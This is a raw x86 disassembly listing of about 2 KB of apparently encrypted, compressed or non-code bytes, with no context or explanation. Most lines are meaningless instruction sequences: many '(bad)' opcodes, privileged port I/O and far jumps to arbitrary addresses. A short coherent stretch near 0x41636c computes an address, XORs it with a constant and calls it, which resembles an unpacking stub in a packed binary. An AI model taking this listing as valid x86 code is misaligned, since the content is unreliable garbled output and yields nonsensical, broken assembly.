  4160ce:	and    bl,BYTE PTR [edi-0x67]
  4160d1:	scas   al,BYTE PTR es:[edi]
  4160d2:	inc    esi
  4160d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160d4:	sti    
  4160d5:	dec    ebx
  4160d6:	jmp    0xea0b:0xf3f578ae
  4160dd:	les    esi,FWORD PTR [esi]
  4160df:	ret    
  4160e0:	cmp    BYTE PTR [ecx+0x3],0x8c
  4160e4:	retf   0xae1f
  4160e7:	dec    BYTE PTR [ecx-0x3f]
  4160ea:	jle    0x4160c8
  4160ec:	sub    DWORD PTR [edx],ebx
  4160ee:	cmp    al,0x33
  4160f0:	cmp    bl,BYTE PTR [ecx-0x57]
  4160f3:	gs mov al,0x59
  4160f6:	push   eax
  4160f7:	rol    DWORD PTR [edx+ebp*2],1
  4160fa:	ror    edx,cl
  4160fc:	add    dl,BYTE PTR [esi]
  4160fe:	imul   ecx,DWORD PTR [ebx-0x5ab30dfe],0x898a6cd0
  416108:	mov    eax,ds:0xfe2d179b
  41610d:	mov    edx,0x8d8c6de7
  416112:	iret   
  416113:	sahf   
  416114:	add    eax,0xe2e60eb6
  416119:	lock lea ecx,ds:0x1dc98158
  416120:	sub    eax,0x729af43f
  416125:	popa   
  416126:	lock push ebx
  416128:	jge    0x416162
  41612a:	cmp    BYTE PTR [eax],0xdf
  41612d:	xchg   edx,eax
  41612e:	out    dx,al
  41612f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416130:	cli    
  416131:	lock lahf 
  416133:	xor    eax,DWORD PTR [esp-0x5a01ea39]
  41613a:	or     edx,edx
  41613c:	jmp    0xe9dbeee4
  416141:	cmp    BYTE PTR [ecx-0x3dd300a3],al
  416147:	cmp    ebp,edx
  416149:	pop    ebp
  41614a:	inc    edi
  41614b:	sbb    DWORD PTR [ecx-0x201c46f0],edi
  416151:	jp     0x4160e1
  416153:	cmp    al,BYTE PTR [eax+0x7e83ae6]
  416159:	aaa    
  41615a:	sub    al,0x71
  41615c:	cmp    al,0x38
  41615e:	ss (bad) 
  416161:	test   al,0xd4
  416163:	jmp    0x4161d5
  416165:	aas    
  416166:	outs   dx,DWORD PTR ds:[esi]
  416167:	je     0x4161b6
  416169:	fstp   QWORD PTR [esi+ecx*4-0x24dea8bb]
  416170:	fbld   TBYTE PTR [edi-0x35]
  416173:	pop    esp
  416174:	stos   DWORD PTR es:[edi],eax
  416175:	jl     0x4161ab
  416177:	xchg   edi,eax
  416178:	ja     0x416174
  41617a:	call   FWORD PTR [esi-0x4cbc0ce9]
  416180:	mov    al,0x35
  416182:	nop    esi
  416185:	js     0x4161ba
  416187:	mov    al,ds:0xc15d9549
  41618c:	das    
  41618d:	or     dl,BYTE PTR [esi+0x2c]
  416190:	adc    esp,edi
  416192:	cmc    
  416193:	stc    
  416194:	or     al,cl
  416196:	lea    ecx,[ebx-0x42]
  416199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41619a:	push   edx
  41619b:	ss cmc 
  41619d:	xchg   esi,eax
  41619e:	mov    ebx,0x37b91e05
  4161a3:	call   ecx
  4161a5:	mov    ebx,DWORD PTR [esp+esi*1-0x5ed766c6]
  4161ac:	push   0x73
  4161ae:	adc    ebp,ebx
  4161b0:	mov    BYTE PTR [esi+ebp*2-0x4d],ch
  4161b4:	and    edx,DWORD PTR [eax+edx*2+0x57]
  4161b8:	ins    BYTE PTR es:[edi],dx
  4161b9:	inc    ecx
  4161ba:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4161bc:	rcl    DWORD PTR [esi+0x52],0xfc
  4161c0:	jecxz  0x41621e
  4161c2:	pusha  
  4161c3:	mov    eax,ds:0x843c0a04
  4161c8:	std    
  4161c9:	outs   dx,BYTE PTR ds:[esi]
  4161ca:	lods   eax,DWORD PTR ds:[esi]
  4161cb:	call   0xa042eb86
  4161d0:	mov    cl,0x6e
  4161d2:	and    al,0xae
  4161d4:	idiv   DWORD PTR [esi+0x40edc54a]
  4161da:	dec    ebx
  4161db:	sbb    BYTE PTR [edi-0x43],cl
  4161de:	push   ebx
  4161df:	mov    esp,0x389a41ce
  4161e4:	mov    esi,0x79a39fdc
  4161e9:	xor    al,ah
  4161eb:	push   ebx
  4161ec:	mov    esi,0x92b4680d
  4161f1:	sbb    eax,0xef319735
  4161f6:	stos   BYTE PTR es:[edi],al
  4161f7:	inc    esi
  4161f8:	cmp    eax,ebx
  4161fa:	enter  0x5348,0x12
  4161fe:	mov    ecx,0xdc92d27d
  416203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416204:	dec    edx
  416205:	popa   
  416206:	mov    al,ds:0x64a249e0
  41620b:	fimul  DWORD PTR [esi-0x30b0d46d]
  416211:	and    bl,BYTE PTR ss:[ebx-0x4e2cf3d7]
  416218:	stc    
  416219:	int    0x10
  41621b:	and    DWORD PTR [edi+0x4d89c7b],ebx
  416221:	mov    ds:0x48c87dea,eax
  416226:	cmp    eax,0xcc3d279a
  41622b:	rol    DWORD PTR [ecx],cl
  41622d:	mov    al,ds:0x1cdc3f7a
  416232:	icebp  
  416233:	lahf   
  416234:	push   ecx
  416235:	cmp    BYTE PTR [bp+0x1bab],ch
  41623a:	xor    eax,0xa45ca67
  41623f:	mov    ah,0xf6
  416241:	push   0x27a5e691
  416246:	ins    DWORD PTR es:[edi],dx
  416247:	dec    eax
  416248:	int    0x2f
  41624a:	and    DWORD PTR [edi+ecx*1-0x19],edi
  41624e:	stos   DWORD PTR es:[edi],eax
  41624f:	out    dx,eax
  416250:	test   eax,0x5712c3c7
  416255:	out    dx,al
  416256:	pop    edx
  416257:	cdq    
  416258:	dec    edi
  416259:	sub    al,0x6d
  41625b:	inc    ebx
  41625c:	and    eax,0x21c4427a
  416261:	push   ebx
  416262:	scas   eax,DWORD PTR es:[edi]
  416263:	bound  ebp,QWORD PTR [ebp-0x6bb4fbec]
  416269:	mov    al,ds:0x1d0beccb
  41626e:	mov    eax,ds:0xeace6fc8
  416273:	push   0xc22bc85d
  416278:	aad    0x0
  41627a:	mov    ch,BYTE PTR [ebx]
  41627c:	adc    cl,ch
  41627e:	inc    edi
  41627f:	sbb    bl,BYTE PTR [edi+0x63]
  416282:	add    cl,BYTE PTR [eax+0x6b]
  416285:	out    0x64,al
  416287:	cmp    eax,0xa87c7531
  41628c:	fbstp  TBYTE PTR [esi]
  41628e:	add    eax,0xa9c69b87
  416293:	lea    esp,[esp+ecx*4+0x40]
  416297:	jle    0x4162cb
  416299:	out    dx,eax
  41629a:	ds xchg ecx,eax
  41629c:	or     cl,dl
  41629e:	and    ah,0xcc
  4162a1:	sub    BYTE PTR [edx-0x1a799b8d],bl
  4162a7:	dec    ebx
  4162a8:	xchg   bh,ch
  4162aa:	and    ch,ah
  4162ac:	push   0x886a16bc
  4162b1:	sub    DWORD PTR [esp+edx*1],eax
  4162b4:	pop    ds
  4162b5:	fwait
  4162b6:	(bad)  
  4162b7:	adc    BYTE PTR [ebx],al
  4162b9:	push   ebp
  4162ba:	imul   al
  4162bc:	mov    ds:0x8ee94cc7,al
  4162c1:	mov    edx,0x42c8947c
  4162c6:	stc    
  4162c7:	jo     0x4162a7
  4162c9:	lahf   
  4162ca:	inc    ebp
  4162cb:	mov    ch,0x59
  4162cd:	cmp    al,0x52
  4162cf:	inc    edi
  4162d0:	push   0x5a0437af
  4162d5:	pop    esp
  4162d6:	out    0xf,eax
  4162d8:	jno    0x416313
  4162da:	mov    ds:0xe0f5cf3f,eax
  4162df:	mov    eax,ss
  4162e1:	ret    0x54b6
  4162e4:	and    bl,0xe9
  4162e7:	xor    DWORD PTR [edi+edi*2-0x7a],esp
  4162eb:	or     BYTE PTR [ebp-0x67],bh
  4162ee:	out    0xac,al
  4162f0:	inc    edi
  4162f1:	mov    ds:0x5912f155,al
  4162f6:	in     eax,0x2
  4162f8:	(bad)  
  4162fa:	pop    eax
  4162fb:	xchg   DWORD PTR [ebx+esi*1-0x47],ebx
  4162ff:	fs jl  0x4162e5
  416302:	ins    DWORD PTR es:[edi],dx
  416303:	scas   al,BYTE PTR es:[edi]
  416304:	loop   0x4162aa
  416306:	mov    ecx,DWORD PTR [ecx-0x77]
  416309:	ins    BYTE PTR es:[edi],dx
  41630a:	neg    BYTE PTR [ebx-0x2edcbb9b]
  416310:	sub    eax,0x6803729c
  416315:	jmp    0x4162bf
  416317:	fxam   
  416319:	lahf   
  41631a:	(bad)  
  41631b:	push   0x3d7c7c49
  416320:	push   eax
  416321:	mov    ecx,0x722243d5
  416326:	mov    ah,0xda
  416328:	mov    al,ds:0x95d33304
  41632d:	and    eax,0x9b4b8c69
  416332:	test   al,0x17
  416334:	fs sbb eax,esi
  416337:	mov    esi,0x1429c1fb
  41633c:	xchg   esi,eax
  41633d:	push   esp
  41633e:	loopne 0x4162ca
  416340:	stos   BYTE PTR es:[edi],al
  416341:	in     eax,dx
  416342:	push   esi
  416343:	mov    BYTE PTR [ecx+eiz*8+0x2a],bl
  416347:	cli    
  416348:	and    DWORD PTR [esi+0x489c7325],0xffffffb9
  41634f:	clc    
  416350:	push   ecx
  416351:	sub    DWORD PTR [edx],eax
  416353:	daa    
  416354:	pop    edx
  416355:	dec    ebp
  416356:	dec    esi
  416357:	(bad)  
  416358:	gs repnz cmc 
  41635b:	cdq    
  41635c:	mov    dl,0x91
  41635e:	lahf   
  41635f:	ret    0x490e
  416362:	mov    al,0x85
  416364:	xor    DWORD PTR [ecx],edi
  416366:	adc    DWORD PTR [ecx+0x55e175bd],ebx
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0x7ad4c841
  4163bf:	sub    DWORD PTR es:[ebx],edx
  4163c2:	adc    al,0x7f
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416399
  4163ca:	je     0x41638a
  4163cc:	or     bh,ch
  4163ce:	add    bh,BYTE PTR [esi]
  4163d0:	or     bh,BYTE PTR [edi]
  4163d2:	push   0xffffff94
  4163d4:	je     0x4163ed
  4163d6:	mov    ch,0xf4
  4163d8:	mov    ebx,0x7192c02f
  4163dd:	xchg   ebp,eax
  4163de:	push   es
  4163df:	mov    WORD PTR [edi+0x74f5c8e2],ss
  4163e5:	sahf   
  4163e6:	push   ebp
  4163e7:	scas   al,BYTE PTR es:[edi]
  4163e8:	sti    
  4163e9:	js     0x41646a
  4163eb:	jo     0x416435
  4163ed:	add    eax,0xb4c87b96
  4163f2:	loope  0x4163ba
  4163f4:	dec    edx
  4163f5:	pop    es
  4163f6:	and    DWORD PTR [ebx-0x69c194c5],edi
  4163fc:	jb     0x416473
  4163fe:	ins    DWORD PTR es:[edi],dx
  4163ff:	push   ebx
  416400:	jg     0x41639d
  416402:	mov    bh,0x61
  416404:	sub    ch,BYTE PTR [ebx+ecx*8]
  416407:	push   ebp
  416408:	xchg   edx,eax
  416409:	and    BYTE PTR [ebp-0x64],dl
  41640c:	lahf   
  41640d:	ins    BYTE PTR es:[edi],dx
  41640e:	add    eax,0x96d56624
  416413:	inc    ebp
  416414:	(bad)  
  416415:	mov    edi,0x8790395e
  41641a:	push   eax
  41641b:	dec    si
  41641d:	jno    0x4163a6
  41641f:	jp     0x416453
  416421:	sbb    bl,bh
  416423:	popf   
  416424:	add    bl,0x8a
  416427:	leave  
  416428:	popf   
  416429:	add    BYTE PTR [esi],cl
  41642b:	mov    bl,0xd2
  41642d:	int    0xca
  41642f:	mov    edx,0x8116c4d7
  416434:	dec    ebp
  416435:	dec    esi
  416436:	lock enter 0x9e63,0x49
  41643b:	mov    ch,0x2a
  41643d:	sub    BYTE PTR [edi+0x0],ah
  416440:	dec    eax
  416441:	shl    BYTE PTR [ecx-0x60],0x1c
  416445:	mov    WORD PTR fs:[ecx+0x262663a4],fs
  41644c:	mov    ?,WORD PTR [edi+0x16]
  41644f:	std    
  416450:	loopne 0x41645e
  416452:	cs (bad) 
  416454:	ror    DWORD PTR [edx+ecx*4+0x6a4af927],1
  41645b:	push   0xffffff94
  41645d:	xchg   ebx,eax
  41645e:	iret   
  41645f:	inc    esp
  416460:	mov    eax,ds:0x69b60842
  416465:	test   ebp,edx
  416467:	jl     0x41647f
  416469:	xchg   BYTE PTR [esi+eiz*8],cl
  41646c:	nop
  41646d:	push   ebx
  41646e:	jmp    0xa896bbfb
  416473:	mov    WORD PTR [edi],gs
  416475:	push   ds
  416476:	pop    ebx
  416477:	pop    ds
  416478:	sbb    eax,0x98c39f44
  41647d:	and    cl,BYTE PTR [edi-0x16]
  416480:	jp     0x4164d5
  416482:	or     DWORD PTR [esi+0x4e3f4aab],ecx
  416488:	fcomi  st,st(6)
  41648a:	push   eax
  41648b:	(bad)  
  41648c:	jno    0x416445
  41648e:	add    al,0x71
  416490:	jl     0x41645f
  416492:	xchg   edi,eax
  416493:	mov    bl,0x8
  416495:	inc    edx
  416496:	pop    es
  416497:	(bad)
  41649b:	xor    DWORD PTR [ebx+0x18956607],ebp
  4164a1:	out    0x94,al
  4164a3:	cmc    
  4164a4:	pop    esp
  4164a5:	rcr    BYTE PTR [ebx],1
  4164a7:	push   ecx
  4164a8:	(bad)  
  4164a9:	nop
  4164aa:	ficomp WORD PTR [ecx]
  4164ac:	sub    cl,cl
  4164ae:	xor    eax,0x166b4a75
  4164b3:	aad    0x8b
  4164b5:	jmp    0x4164bb
  4164b7:	retf   0x17e4
  4164ba:	fnsave [esi]
  4164bc:	stos   DWORD PTR es:[edi],eax
  4164bd:	fwait
  4164be:	mov    bl,0x37
  4164c0:	popf   
  4164c1:	hlt    
  4164c2:	inc    ecx
  4164c3:	ret    
  4164c4:	out    dx,eax
  4164c5:	xor    al,0xdf
  4164c7:	leave  
  4164c8:	add    DWORD PTR [esi-0x2b7e4800],eax
  4164ce:	rcl    ch,0xc9
  4164d1:	sbb    ah,BYTE PTR [edi]
  4164d3:	pop    eax
  4164d4:	fld    TBYTE PTR [esi]
  4164d6:	scas   eax,DWORD PTR es:[edi]
  4164d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164d8:	cdq    
  4164d9:	loop   0x4164cd
  4164db:	lea    esp,[ebx]
  4164dd:	adc    ecx,DWORD PTR [ebx+0x78]
  4164e0:	xor    BYTE PTR [edi+0x75b58ec3],al
  4164e6:	and    DWORD PTR [eax+0x658df316],esp
  4164ec:	jge    0x4164cc
  4164ee:	je     0x41649b
  4164f0:	fs pop esi
  4164f2:	nop
  4164f3:	shl    ebx,1
  4164f5:	or     eax,0x913c4f51
  4164fa:	test   DWORD PTR [edi+edx*8-0x37],0xab9a9f2b
  416502:	fcomp  DWORD PTR [ebp+0x22]
  416505:	sub    BYTE PTR [ebp+0x1836cc27],0xea
  41650c:	jp     0x41658c
  41650e:	out    0xbb,eax
  416510:	add    eax,0xdc260d49
  416515:	sbb    esp,DWORD PTR [eax+0x30]
  416518:	fldcw  WORD PTR [ebx+0x29]
  41651b:	out    0x85,eax
  41651d:	sbb    DWORD PTR [esi-0x27],edi
  416520:	and    eax,DWORD PTR [ecx]
  416522:	in     al,0x67
  416524:	mov    ebx,DWORD PTR [esi-0x298edecd]
  41652a:	aas    
  41652b:	rcr    BYTE PTR [ebx],1
  41652d:	mov    edx,0x66fe8e37
  416532:	adc    eax,0xf62ec632
  416537:	xchg   edi,eax
  416538:	cmp    esi,DWORD PTR [edx-0x1f]
  41653b:	inc    esp
  41653c:	mov    edx,0x3aad0e24
  416541:	mov    BYTE PTR [eax+ebx*8],0xfd
  416545:	fisttp WORD PTR [ebx-0x5e1e0478]
  41654b:	cmp    cl,BYTE PTR [edi-0x29]
  41654e:	push   edi
  41654f:	(bad)  
  416551:	ss das 
  416553:	(bad)  
  416555:	sub    eax,0x84876ed8
  41655a:	js     0x416545
  41655c:	mov    dl,cl
  41655e:	lds    ecx,FWORD PTR [ebx-0x510f21c5]
  416564:	outs   dx,DWORD PTR ds:[esi]
  416565:	inc    esi
  416566:	push   esi
  416567:	fs jo  0x416540
  41656a:	adc    eax,0x4b099e9
  41656f:	push   esp
  416570:	fadd   QWORD PTR [edi-0x421ba392]
  416576:	ins    BYTE PTR es:[edi],dx
  416577:	into   
  416578:	xchg   esi,eax
  416579:	fsubr  QWORD PTR [ebp-0x48]
  41657c:	dec    esi
  41657d:	push   ecx
  41657e:	or     eax,0x3d2285ee
  416583:	lods   eax,DWORD PTR ds:[esi]
  416584:	call   0x7c9f:0x5e3fb829
  41658b:	cs stc 
  41658d:	or     BYTE PTR [ebx-0x61],dl
  416590:	mov    al,ds:0x1ddc9a3b
  416595:	outs   dx,BYTE PTR ds:[esi]
  416596:	(bad)  
  416597:	cmp    cl,bh
  416599:	outs   dx,DWORD PTR ds:[esi]
  41659a:	push   eax
  41659b:	mov    esi,0xb5fb5b1c
  4165a0:	loopne 0x41658c
  4165a2:	ins    BYTE PTR es:[edi],dx
  4165a3:	push   0x645e24cd
  4165a8:	adc    al,0xf1
  4165aa:	xor    al,0x16
  4165ac:	jg     0x416616
  4165ae:	pop    ebp
  4165af:	fist   WORD PTR [edi]
  4165b1:	div    DWORD PTR [edi+edi*1-0x179e8e5f]
  4165b8:	nop
  4165b9:	ds dec ebx
  4165bb:	dec    edi
  4165bc:	dec    ebp
  4165bd:	outs   dx,BYTE PTR ds:[esi]
  4165be:	ret    0x28de
  4165c1:	xchg   ecx,eax
  4165c2:	cs dec edi
  4165c4:	add    bl,BYTE PTR [edi]
  4165c6:	mov    dl,0x6e
  4165c8:	dec    ecx
  4165c9:	jae    0x416586
  4165cb:	sub    edx,DWORD PTR [edx-0x37]
  4165ce:	push   eax
  4165cf:	mov    ebx,0x545501cd
  4165d4:	shl    ah,cl
  4165d6:	out    dx,al
  4165d7:	(bad)  
  4165d8:	or     eax,0x38d187af
  4165dd:	imul   ebp,DWORD PTR ds:0xb3d31721,0xaf2abfc8
  4165e7:	popf   
  4165e8:	repnz fsubp st(4),st
  4165eb:	mov    dl,ah
  4165ed:	hlt    
  4165ee:	addr16 mov esp,0x67b3ad1f
  4165f4:	xor    eax,0x42e675cb
  4165f9:	xor    cl,BYTE PTR [eax+0x1cf364ca]
  4165ff:	mov    ds:0x19f7fea3,al
  416604:	push   0x8c20aecd
  416609:	into   
  41660a:	mov    BYTE PTR [ebp-0x6128e9b],bl
  416610:	call   0x9b9b:0xd513e7db
  416617:	add    dh,BYTE PTR [ebx]
  416619:	push   ds
  41661a:	mov    bl,0x72
  41661c:	iret   
  41661d:	clc    
  41661e:	push   eax
  41661f:	push   ebx
  416620:	in     al,0xfc
  416622:	in     eax,0xc5
  416624:	pop    ds
  416625:	push   ds
  416626:	int    0x14
  416628:	dec    esi
  416629:	outs   dx,BYTE PTR ds:[esi]
  41662a:	pop    DWORD PTR [ebx-0x4f]
  41662d:	jns    0x4165e1
  41662f:	dec    ebx
  416630:	popf   
  416631:	bswap  edi
  416633:	scas   eax,DWORD PTR es:[edi]
  416634:	xchg   BYTE PTR [esi-0x33],dl
  416637:	cwde   
  416638:	ins    BYTE PTR es:[edi],dx
  416639:	jge    0x416649
  41663b:	sbb    ah,BYTE PTR [edi+0x1e905116]
  416641:	mov    ds:0x962dfacb,al
  416646:	inc    edi
  416647:	enter  0x6063,0xbf
  41664b:	out    dx,eax
  41664c:	add    eax,0x7cc73167
  416651:	stos   BYTE PTR es:[edi],al
  416652:	and    eax,0xe9d6df92
  416657:	xor    al,0xc2
  416659:	mov    edx,0x8e15f74c
  41665e:	push   ss
  41665f:	sbb    BYTE PTR [ecx],ch
  416661:	mov    dl,0x4e
  416663:	das    
  416664:	inc    ecx
  416665:	cmp    al,0x9f
  416667:	and    al,0x81
  416669:	push   edx
  41666a:	stos   DWORD PTR es:[edi],eax
  41666b:	mov    dl,0x85
  41666d:	dec    ebx
  41666e:	fild   WORD PTR [ecx]
  416670:	push   ebx
  416671:	(bad)  
  416672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416673:	inc    ecx
  416674:	shl    BYTE PTR [ebx-0x2f],0xb5
  416678:	rol    ch,0xa
  41667b:	cmp    BYTE PTR [edi+ebx*4-0x5f276441],0xdb
  416683:	test   BYTE PTR [eax+0x5f],bl
  416686:	leave  
  416687:	adc    al,0xdb
  416689:	dec    eax
  41668a:	push   ebp
  41668b:	loop   0x4166a4
  41668d:	xchg   ebp,eax
  41668e:	xor    BYTE PTR [ecx-0x6e],0x6a
  416692:	or     bl,BYTE PTR [ecx+0x6a]
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x41663b
  4166ae:	push   eax
  4166af:	cmp    eax,0x7f125c48
  4166b4:	jo     0x41666f
  4166b6:	jle    0x416728
  4166b8:	jo     0x4166e2
  4166ba:	pop    esi
  4166bb:	cli    
  4166bc:	mov    bl,0xcb
  4166be:	(bad)  
  4166bf:	lods   eax,DWORD PTR ds:[esi]
  4166c0:	dec    edx
  4166c1:	cmc    
  4166c2:	lahf   
  4166c3:	sar    BYTE PTR [esi-0x6e],0x14
  4166c7:	rcr    DWORD PTR [edi+0x69],cl
  4166ca:	pop    esp
  4166cb:	stos   DWORD PTR es:[edi],eax
  4166cc:	or     ebp,DWORD PTR [ebp+0x4ada2170]
  4166d2:	lods   al,BYTE PTR ds:[esi]
  4166d3:	fdiv   DWORD PTR [ebp-0x356aa753]
  4166d9:	cdq    
  4166da:	lock lock adc al,BYTE PTR [ecx-0x5959c7ad]
  4166e2:	rcr    DWORD PTR ds:0x232a69be,cl
  4166e8:	dec    edx
  4166e9:	jmp    0x4377:0x22315138
  4166f0:	jbe    0x41668f
  4166f2:	mov    al,ds:0x23f58244
  4166f7:	sbb    dh,BYTE PTR [ecx-0x19]
  4166fa:	sbb    edx,DWORD PTR gs:[edx+ebx*8-0x14fee5af]
  416702:	repnz add al,BYTE PTR [ebp+0x1a8a7add]
  416709:	(bad)  
  41670a:	pop    ebp
  41670b:	call   0x1c28:0x2efeaa79
  416712:	mov    ds,WORD PTR [ebp+0x21]
  416715:	push   ds
  416716:	dec    ebp
  416717:	scas   al,BYTE PTR es:[edi]
  416718:	adc    BYTE PTR [esi+0x1],0x3f
  41671c:	jno    0x4166e7
  41671e:	xor    DWORD PTR [ecx-0x27f8f69c],esi
  416724:	mov    bh,0x51
  416726:	mov    esp,0xb2656692
  41672b:	in     eax,dx
  41672c:	scas   eax,DWORD PTR es:[edi]
  41672d:	sbb    bl,BYTE PTR ds:0xd797590e
  416733:	mov    al,ds:0x2dd571ed
  416738:	jo     0x41679e
  41673a:	inc    ebx
  41673b:	in     al,dx
  41673c:	popf   
  41673d:	clc    
  41673e:	inc    esp
  41673f:	mov    eax,ds:0x9bf57ea5
  416744:	jmp    0xa87a:0xdf2af9f
  41674b:	(bad)  
  41674c:	std    
  41674d:	(bad)
  416750:	leave  
  416751:	arpl   dx,bp
  416753:	out    dx,al
  416754:	or     cl,BYTE PTR [eax]
  416756:	test   BYTE PTR [edx+0x5ecd26da],dh
  41675c:	in     al,0x5b
  41675e:	shl    DWORD PTR [edi-0x31],0xc5
  416762:	sub    DWORD PTR [edx+0x59],esp
  416765:	ja     0x416744
  416767:	pop    ecx
  416768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416769:	xchg   ecx,eax
  41676a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41676b:	dec    eax
  41676c:	push   edx
  41676d:	loope  0x41679b
  41676f:	mov    dh,0x59
  416771:	xor    al,0x91
  416773:	jne    0x41674d
  416775:	lds    ebx,FWORD PTR [edi+esi*2-0x74]
  416779:	or     eax,0x50e54ecf
  41677e:	inc    ebx
  41677f:	retf   0x5080
  416782:	jg     0x41679e
  416784:	fimul  WORD PTR [edx+0x4e0cb788]
  41678a:	adc    DWORD PTR [ebx],ecx
  41678c:	xor    al,0xc2
  41678e:	jle    0x4167ad
  416790:	jg     0x416729
  416792:	in     al,dx
  416793:	xchg   ebx,eax
  416794:	dec    ecx
  416795:	mov    al,ds:0xf4f808de
  41679a:	ret    
  41679b:	jl     0x416809
  41679d:	imul   ebp,DWORD PTR [ebp-0x5068ee26],0x3441881e
  4167a7:	sub    eax,0x3575060c
  4167ac:	aas    
  4167ad:	push   0x504428ff
  4167b2:	fdiv   QWORD PTR [ebx+ecx*4]
  4167b5:	jecxz  0x4167c6
  4167b7:	push   ecx
  4167b8:	inc    BYTE PTR [ebx+0x5e3146c3]
  4167be:	dec    edi
  4167bf:	fild   QWORD PTR [edi]
  4167c1:	adc    ebp,DWORD PTR ds:0x73e4b3b4
  4167c7:	fist   WORD PTR [edi]
  4167c9:	test   BYTE PTR [eax+0x28],ah
  4167cc:	ins    BYTE PTR es:[edi],dx
  4167cd:	retf   
  4167ce:	push   ss
  4167cf:	jg     0x41677c
  4167d1:	pop    es
  4167d2:	inc    edi
  4167d3:	add    BYTE PTR [ebp+0x3c],ch
  4167d6:	stc    
  4167d7:	test   DWORD PTR [edi+0x445f394c],edi
  4167dd:	retf   
  4167de:	cdq    
  4167df:	xchg   DWORD PTR [edi+edx*8-0x3],esi
  4167e3:	lock push 0x18
  4167e6:	push   0x4cb30437
  4167eb:	xchg   esp,eax
  4167ec:	push   eax
  4167ed:	lds    ecx,FWORD PTR [eax-0xa]
  4167f0:	mov    al,BYTE PTR [ebx+0x7c]
  4167f3:	fidiv  DWORD PTR [eax-0x25]
  4167f6:	dec    ebx
  4167f7:	or     esi,ecx
  4167f9:	fwait
  4167fa:	cs add ch,dl
  4167fd:	mov    eax,0xffa6b3cc
  416802:	jae    0x4167bd
  416804:	sbb    ch,BYTE PTR [eax-0x2fd8946]
  41680a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41680b:	mov    eax,ds:0x1534355f
  416810:	mov    eax,0x8257d3c8
  416815:	pop    ebx
  416816:	addr16 mov dl,0xba
  416819:	or     BYTE PTR [ecx+0x36],ah
  41681c:	dec    ecx
  41681d:	sti    
  41681e:	push   ss
  41681f:	(bad)  
  416820:	ja     0x416802
  416822:	push   edx
  416823:	ret    0x372e
  416826:	bound  esi,QWORD PTR [ebx-0x221c404c]
  41682c:	sub    BYTE PTR [ebx*8+0x3602a8e9],al
  416833:	int3   
  416834:	dec    ecx
  416835:	push   ebp
  416836:	push   ds
  416837:	sub    esp,DWORD PTR [ebp-0x70c495c7]
  41683d:	sbb    edx,edx
  41683f:	dec    ecx
  416840:	xor    eax,0x86f3208c
  416845:	push   ss
  416846:	int3   
  416847:	inc    edx
  416848:	mov    edx,0xafa90100
  41684d:	mov    edx,0x14748a08
  416852:	les    edi,FWORD PTR [eax-0x25]
  416855:	adc    ah,BYTE PTR [eax+0x40]
  416858:	mov    DWORD PTR [ebp-0x16],esp
  41685b:	pop    eax
  41685c:	ret    0xb985
  41685f:	repnz xor DWORD PTR [ebp+0x39],ebp
  416863:	test   eax,0x4aa39523
  416868:	pop    esp
  416869:	out    0xb9,al
  41686b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41686c:	loope  0x416803
  41686e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41686f:	jge    0x41682f
  416871:	mov    al,0x60
  416873:	in     eax,dx
  416874:	je     0x416831
  416876:	and    al,0xf
  416878:	xor    al,0xe1
  41687a:	lods   eax,DWORD PTR ds:[esi]
  41687b:	fsubr  QWORD PTR [eax+esi*1+0x4faa2079]
  416882:	lahf   
  416883:	push   0xffffff9b
  416885:	imul   edx,DWORD PTR [esi],0xffffff8a
  416888:	sub    al,BYTE PTR [edi+0x72]
  41688b:	repz out 0xde,eax
  41688e:	and    eax,0x50c7844
  416893:	push   esp
  416894:	loopne 0x416867
  416896:	adc    eax,eax
  416898:	retf   0x60d8
  41689b:	stc    
  41689c:	sub    BYTE PTR [edi],ah
  41689e:	cmp    BYTE PTR [edx+0x5f],ah
  4168a1:	cdq    
  4168a2:	test   eax,0x637df5f5
  4168a8:	cwde   
  4168a9:	(bad)  
  4168aa:	clc    
  4168ab:	test   eax,0xc89d35b0
  4168b0:	frstor [edx]
  4168b2:	out    0x86,al
  4168b4:	pop    ss
  4168b5:	dec    esi
  4168b6:	sub    eax,ecx
  4168b8:	(bad)  
  4168b9:	cld    
  4168ba:	dec    ebp
  4168bb:	jmp    0xf8ccfcc3
  4168c0:	inc    ebx
  4168c1:	dec    ebp
  4168c2:	xor    ebp,DWORD PTR [edx+edi*8-0x17]
  4168c6:	dec    edx
  4168c7:	jne    0x4168a6
  4168c9:	xor    eax,0x6e3dc2e1
  4168ce:	or     eax,0x60e258c8
  4168d3:	adc    DWORD PTR [eax],esp
